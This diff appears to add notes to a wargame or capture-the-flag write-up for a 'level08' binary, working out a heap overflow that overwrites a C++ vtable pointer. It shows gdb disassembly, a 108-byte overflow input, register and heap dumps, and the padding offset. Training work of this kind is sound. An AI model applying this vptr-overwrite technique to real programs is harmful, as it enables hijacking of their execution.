@@ -29,6 +29,72 @@ int main(int argc, char **argv)
         return six + five;
 }
 
+http://phrack.org/issues/56/8.html#article SMASHING C++ VPTRS
+
+In this task we overwriting vptr to virtual int operator+(Number &r) {return number + r.number;} method
+
+....
+   0x0804871b <+135>:	call   0x80487b6 <Number::setAnnotation(char*)>
+   0x08048720 <+140>:	mov    eax,DWORD PTR [esp+0x1c]
+   0x08048724 <+144>:	mov    eax,DWORD PTR [eax]
+   0x08048726 <+146>:	mov    edx,DWORD PTR [eax]
+   0x08048728 <+148>:	mov    eax,DWORD PTR [esp+0x18]
+   0x0804872c <+152>:	mov    DWORD PTR [esp+0x4],eax
+   0x08048730 <+156>:	mov    eax,DWORD PTR [esp+0x1c]
+   0x08048734 <+160>:	mov    DWORD PTR [esp],eax
+=> 0x08048737 <+163>:	call   edx                              <--------- calling operator+ method
+   0x08048739 <+165>:	add    esp,0x2c
+   0x0804873c <+168>:	pop    ebx
+   0x0804873d <+169>:	mov    esp,ebp
+   0x0804873f <+171>:	pop    ebp
+   0x08048740 <+172>:	ret    
+   
+...
+>gdb -x /usr/share/gdbinit --args ./level08 $(python -c "print 'A' * 108")
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x804ea80 --> 0x80488c8 --> 0x80487e2 (<Number::operator+(Number&)>:	push   ebp)
+EBX: 0x804ea80 --> 0x80488c8 --> 0x80487e2 (<Number::operator+(Number&)>:	push   ebp)
+ECX: 0x6c ('l')
+EDX: 0x80487e2 (<Number::operator+(Number&)>:	push   ebp)
+ESI: 0xf7dca000 --> 0x1b1db0 
+EDI: 0xf7dca000 --> 0x1b1db0 
+EBP: 0xffffcee8 --> 0x0 
+ESP: 0xffffceb0 --> 0x804ea80 --> 0x80488c8 --> 0x80487e2 (<Number::operator+(Number&)>:	push   ebp)
+EIP: 0x8048737 (<main+163>:	call   edx)
+EFLAGS: 0x283 (CARRY parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804872c <main+152>:	mov    DWORD PTR [esp+0x4],eax
+   0x8048730 <main+156>:	mov    eax,DWORD PTR [esp+0x1c]
+   0x8048734 <main+160>:	mov    DWORD PTR [esp],eax
+=> 0x8048737 <main+163>:	call   edx
+   0x8048739 <main+165>:	add    esp,0x2c
+   0x804873c <main+168>:	pop    ebx
+   0x804873d <main+169>:	mov    esp,ebp
+   0x804873f <main+171>:	pop    ebp
+Guessed arguments:
+arg[0]: 0x804ea80 --> 0x80488c8 --> 0x80487e2 (<Number::operator+(Number&)>:	push   ebp)
+arg[1]: 0x804ea10 --> 0x80488c8 --> 0x80487e2 (<Number::operator+(Number&)>:	push   ebp)
+
+gdb-peda$ x/64wx 0x804ea00
+0x804ea00:	0x00000000	0x00000000	0x00000000	0x00000071
+0x804ea10:	0x080488c8	0x41414141	0x41414141	0x41414141
+0x804ea20:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea30:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea40:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea50:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea60:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea70:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804ea80:	0x080488c8	0x00000000	0x00000000	0x00000000
+0x804ea90:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eaa0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eab0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eac0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804ead0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804eae0:	0x00000000	0x00000000	0x00000006	0x00020519
+0x804eaf0:	0x00000000	0x00000000	0x00000000	0x00000000
+
+
 padding = 108
 
 b * main+140 
